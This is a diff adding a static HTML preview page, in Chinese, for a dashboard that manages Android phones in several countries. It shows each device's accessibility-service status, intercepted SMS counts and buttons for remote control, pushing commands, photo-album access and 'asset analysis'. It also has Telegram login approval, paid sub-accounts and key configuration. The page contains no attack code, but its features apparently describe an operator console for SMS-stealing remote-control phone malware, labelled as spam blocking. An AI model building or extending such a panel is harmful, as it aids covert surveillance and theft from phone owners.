@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>智能设备管理仪表盘 | 短信拦截详情</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:#f0f2f8;font-family:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;padding:24px;color:#0f172a}
+    .dashboard{max-width:1600px;margin:0 auto}
+    .hero,.card{background:#fff;border:1px solid rgba(226,232,240,.9);box-shadow:0 4px 12px rgba(0,0,0,.03)}
+    .profile-badge{position:fixed;top:18px;left:18px;z-index:1000;display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:999px;background:rgba(255,255,255,.92);box-shadow:0 10px 24px rgba(15,23,42,.12);border:1px solid rgba(226,232,240,.95);-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);cursor:pointer}
+    .profile-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,#f59e0b,#fb7185);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700}
+    .profile-copy{display:flex;flex-direction:column;line-height:1.1}.profile-name{font-size:13px;font-weight:700;color:#0f172a}.profile-sub{font-size:12px;color:#64748b}
+    .hero{border-radius:24px;padding:22px 24px;margin-bottom:20px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;background:linear-gradient(135deg,#ffffff 0%,#f8fbff 100%)}
+    .hero h1{font-size:28px;line-height:1.1;margin-bottom:8px}
+    .hero p{color:#5b6e8c}
+    .hero-stats{display:grid;grid-template-columns:repeat(3,minmax(120px,1fr));gap:12px;min-width:min(520px,100%)}
+    .stat{background:#f8fafd;border:1px solid #eef2f8;border-radius:18px;padding:14px 16px}
+    .label{font-size:12px;color:#64748b;margin-bottom:6px}.value{font-size:24px;font-weight:700}
+    .notification{margin-bottom:20px;padding:14px 18px;border-radius:18px;background:linear-gradient(135deg,#fef3c7 0%,#fde68a 100%);display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;border-left:4px solid #f59e0b}
+    .btn{border:0;border-radius:999px;padding:10px 14px;font-weight:600;cursor:pointer}
+    .btn-primary{background:#f59e0b;color:#fff}.btn-secondary{background:#fff;color:#78350f;border:1px solid #fde68a}
+    .card{border-radius:24px;margin-bottom:20px;overflow:hidden}
+    .card-header{padding:18px 24px;border-bottom:1px solid #f0f2f8;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
+    .card-title{font-size:16px;font-weight:700}.card-body{padding:20px 24px}
+    .module-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px;margin-bottom:20px}
+    .module-card{border-radius:22px;padding:20px;background:linear-gradient(135deg,#ffffff 0%,#f8fbff 100%);border:1px solid rgba(226,232,240,.9)}
+    .module-top{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:14px}
+    .module-title{font-size:15px;font-weight:700;margin-bottom:6px}
+    .module-desc{font-size:13px;color:#64748b;line-height:1.6}
+    .module-chip-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+    .module-chip{padding:6px 10px;border-radius:999px;background:#eef4ff;color:#2563eb;font-size:12px;font-weight:600}
+    .module-chip.soft{background:#f1f5f9;color:#475569}
+    .module-actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:16px}
+    .module-link{border:1px solid #dbeafe;background:#fff;color:#1d4ed8;border-radius:12px;padding:10px 14px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;justify-content:center}
+    .module-link.alt{border-color:#e2e8f0;color:#334155}
+    .module-link.danger{border-color:#fecaca;color:#b91c1c}
+    .module-link.success{border-color:#bbf7d0;color:#047857}
+    .filter-actions{margin-left:auto;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+    .summary-grid{display:grid;grid-template-columns:repeat(3,minmax(120px,1fr));gap:12px;margin-top:18px}
+    .filters{display:flex;flex-wrap:wrap;gap:12px;align-items:flex-end}
+    .field{display:flex;flex-direction:column;gap:6px}.field label{font-size:12px;color:#64748b}
+    input,select{height:40px;border:1.5px solid #e2e8f0;border-radius:12px;padding:0 14px;background:#fff;font:inherit;min-width:160px}
+    .table-wrap{overflow-x:auto}
+    table{width:100%;border-collapse:collapse;font-size:13px}
+    th,td{padding:14px 12px;border-bottom:1px solid #f5f7fb;text-align:left;white-space:nowrap}
+    th{background:#fafcff;color:#64748b;font-size:12px;letter-spacing:.04em;text-transform:uppercase}
+    tr:hover td{background:#f8fafc}
+    .tag{display:inline-flex;padding:4px 12px;border-radius:999px;font-size:12px;font-weight:600}
+    .ok{background:#e0f2e9;color:#11734c}.muted{background:#f1f5f9;color:#475569}.warn{background:#fee2e2;color:#991b1b}
+    .actions{display:flex;gap:6px;flex-wrap:wrap}.action{border:0;background:transparent;border-radius:8px;padding:6px 10px;cursor:pointer;font-weight:600;font-size:12px}
+    .a-info{color:#2080f0}.a-success{color:#10b981}.a-warn{color:#f0a020}.a-danger{color:#d03050}
+    .pagination{padding:18px 24px;border-top:1px solid #f0f2f8;display:flex;justify-content:flex-end;gap:12px;flex-wrap:wrap;color:#64748b}
+    .note{font-size:12px;color:#64748b}
+    @media (max-width: 900px){body{padding:16px}.hero-stats{min-width:100%;grid-template-columns:repeat(2,minmax(120px,1fr))}.module-grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="profile-badge" onclick="window.location.href='/user/profile.html'">
+    <div class="profile-avatar">A</div>
+    <div class="profile-copy">
+      <span class="profile-name">Admin</span>
+      <span class="profile-sub">点击查看个人资料</span>
+    </div>
+  </div>
+  <div class="dashboard">
+    <section class="hero">
+      <div>
+        <h1>基础列表</h1>
+        <p>更清晰的设备概览、筛选和操作入口，默认保留原有能力。</p>
+      </div>
+      <div class="hero-stats">
+        <div class="stat"><div class="label">当前总数</div><div class="value">10</div></div>
+        <div class="stat"><div class="label">当前页数</div><div class="value">2</div></div>
+        <div class="stat"><div class="label">当前加载</div><div class="value">5</div></div>
+      </div>
+    </section>
+
+    <div class="notification">
+      <div>🛡️ 短信拦截服务 · 6/10 台设备已开启 · 累计拦截 75 条垃圾短信</div>
+      <div>
+        <button class="btn btn-secondary">全部拦截记录</button>
+        <button class="btn btn-primary">一键开启全部拦截</button>
+      </div>
+    </div>
+
+    <section class="module-grid">
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">用户模块</div>
+            <div class="module-desc">集中查看账号、权限、在线状态和账号关联设备，适合做运营与权限管理入口。</div>
+          </div>
+          <span class="tag ok">核心</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">账号列表</span>
+          <span class="module-chip soft">权限管理</span>
+          <span class="module-chip soft">在线用户</span>
+          <span class="module-chip soft">最近登录</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link" href="/user/">进入用户模块</a>
+          <a class="module-link alt" href="/user/profile.html">查看用户资料</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">个人资料模块</div>
+            <div class="module-desc">展示头像、昵称、联系方式、登录记录和安全状态，适合快速修改个人信息。</div>
+          </div>
+          <span class="tag muted">个人</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">头像</span>
+          <span class="module-chip soft">昵称</span>
+          <span class="module-chip soft">手机号</span>
+          <span class="module-chip soft">安全设置</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link" href="/user/profile.html">打开个人资料</a>
+          <a class="module-link alt" href="/user/settings.html">账号设置</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">登录审批模块</div>
+            <div class="module-desc">对接 TG 登录审批流程，支持申请、状态轮询和允许/拒绝决策。</div>
+          </div>
+          <span class="tag warn">审批</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">申请列表</span>
+          <span class="module-chip soft">等待审批</span>
+          <span class="module-chip soft">TG 通知</span>
+          <span class="module-chip soft">状态轮询</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link danger" href="/api/login_request.php">提交申请</a>
+          <a class="module-link alt" href="/api/login_status.php">查看状态</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">设备管理模块</div>
+            <div class="module-desc">承接设备上报、短信拦截、相册和资产分析等操作入口。</div>
+          </div>
+          <span class="tag ok">设备</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">设备上报</span>
+          <span class="module-chip soft">短信拦截</span>
+          <span class="module-chip soft">相册</span>
+          <span class="module-chip soft">资产分析</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link success" href="/api/Ping.php">设备上报接口</a>
+          <a class="module-link alt" href="/api/EaodAllDevices.php">设备列表接口</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">WebSocket 状态模块</div>
+            <div class="module-desc">查看 ws 在线状态、会话、协议切换和 Redis 事件流入口。</div>
+          </div>
+          <span class="tag muted">WS</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">在线状态</span>
+          <span class="module-chip soft">协议会话</span>
+          <span class="module-chip soft">Redis 总线</span>
+          <span class="module-chip soft">MQTT 桥接</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link" href="/api/ws/healthz">健康检查</a>
+          <a class="module-link alt" href="/api/protocol_session.php">协议会话</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">子账户模块</div>
+            <div class="module-desc">用于创建、续费、改密和切换登录的子账户管理入口。</div>
+          </div>
+          <span class="tag muted">账号</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">子账户列表</span>
+          <span class="module-chip soft">续费</span>
+          <span class="module-chip soft">改密码</span>
+          <span class="module-chip soft">切换登录</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link" href="/api/SubAccount.php">子账户接口</a>
+          <a class="module-link alt" href="/root/subaccount.html">子账户页面</a>
+        </div>
+      </div>
+
+      <div class="module-card">
+        <div class="module-top">
+          <div>
+            <div class="module-title">系统配置模块</div>
+            <div class="module-desc">承接登录密钥、WebSocket 密钥、TG 配置和系统全局变量。</div>
+          </div>
+          <span class="tag ok">配置</span>
+        </div>
+        <div class="module-chip-row">
+          <span class="module-chip">管理员密钥</span>
+          <span class="module-chip soft">WS_SECRET</span>
+          <span class="module-chip soft">TG Bot</span>
+          <span class="module-chip soft">DB 配置</span>
+        </div>
+        <div class="module-actions">
+          <a class="module-link success" href="/private/login.php">管理入口</a>
+          <a class="module-link alt" href="/private/Eaod85401.php">核心配置</a>
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-header">
+        <div class="card-title">设备筛选与搜索</div>
+        <button class="btn btn-secondary">重置筛选</button>
+      </div>
+      <div class="card-body">
+        <div class="filters">
+          <div class="field"><label>备注/号码</label><input value="张" placeholder="设备备注或号码" title="设备备注或号码"></div>
+          <div class="field"><label>国家</label><select title="国家筛选"><option>全部</option><option selected>中国</option><option>美国</option><option>印度</option></select></div>
+          <div class="field"><label>拦截状态</label><select title="拦截状态筛选"><option>全部</option><option selected>已开启</option><option>未开启</option></select></div>
+          <div class="field"><label>型号</label><input placeholder="设备型号" title="设备型号"></div>
+          <div class="field"><label>安装日期</label><input type="date" title="安装日期"></div>
+          <div class="filter-actions">
+            <button class="btn btn-primary">查询</button>
+            <button class="btn btn-secondary">重置</button>
+          </div>
+        </div>
+        <div class="summary-grid">
+          <div class="stat"><div class="label">无障碍已开启</div><div class="value">6</div></div>
+          <div class="stat"><div class="label">今日新增设备</div><div class="value">2</div></div>
+          <div class="stat"><div class="label">覆盖国家/地区</div><div class="value">4</div></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-header">
+        <div class="card-title">设备清单</div>
+        <div class="tag ok">点击拦截数字查看拦截详情</div>
+      </div>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>设备号码</th><th>备注</th><th>国家</th><th>安卓版本</th><th>型号</th><th>电池</th><th>无障碍</th><th>安装日期</th><th>短信拦截</th><th>操作</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>+86 138****1234</td><td>张先生</td><td>CN</td><td>Android 16</td><td>OPPO F25 Pro 5G</td><td>56%</td><td><span class="tag ok">已开启</span></td><td>2026-05-26</td><td><span class="tag warn">🚫 3</span></td><td><div class="actions"><button class="action a-info">控制</button><button class="action a-warn">下发</button><button class="action a-success">相册</button><button class="action a-danger">资产分析</button></div></td>
+            </tr>
+            <tr>
+              <td>+86 139****5678</td><td>李女士</td><td>CN</td><td>Android 9</td><td>VOG-AL00</td><td>100%</td><td><span class="tag ok">已开启</span></td><td>2026-05-25</td><td><span class="tag warn">🚫 12</span></td><td><div class="actions"><button class="action a-info">控制</button><button class="action a-warn">下发</button><button class="action a-success">相册</button><button class="action a-danger">资产分析</button></div></td>
+            </tr>
+            <tr>
+              <td>+91 987****3456</td><td>陈女士</td><td>IN</td><td>Android 16</td><td>OPPO A6x 5G</td><td>10%</td><td><span class="tag ok">已开启</span></td><td>2026-05-25</td><td><span class="tag warn">🚫 8</span></td><td><div class="actions"><button class="action a-info">控制</button><button class="action a-warn">下发</button><button class="action a-success">相册</button><button class="action a-danger">资产分析</button></div></td>
+            </tr>
+            <tr>
+              <td>+1 212****7890</td><td>赵先生</td><td>US</td><td>Android 15</td><td>realme C53</td><td>63%</td><td><span class="tag muted">未开启</span></td><td>2026-05-25</td><td><span class="tag muted">无拦截</span></td><td><div class="actions"><button class="action a-info">控制</button><button class="action a-warn">下发</button><button class="action a-success">相册</button><button class="action a-danger">资产分析</button></div></td>
+            </tr>
+            <tr>
+              <td>+44 770****6789</td><td>周先生</td><td>GB</td><td>Android 15</td><td>OPPO F27 Pro+ 5G</td><td>42%</td><td><span class="tag muted">未开启</span></td><td>2026-05-25</td><td><span class="tag muted">无拦截</span></td><td><div class="actions"><button class="action a-info">控制</button><button class="action a-warn">下发</button><button class="action a-success">相册</button><button class="action a-danger">资产分析</button></div></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="pagination">
+        <div>共 10 条</div>
+        <div>‹ 1 2 ›</div>
+        <div>5 / 页</div>
+        <div>跳至 1 GO</div>
+      </div>
+    </section>
+
+    <div class="note">这是一个可直接打开的基础列表预览页，用来先让你看到你要的布局效果。</div>
+  </div>
+</body>
+</html>
